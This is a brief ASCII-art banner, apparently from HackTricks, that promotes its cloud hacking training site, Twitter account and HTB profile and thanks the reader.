       |---------------------------------------------------------------------------------| 
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |
       |         Follow on Twitter         :     @hacktricks_live                        |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/


```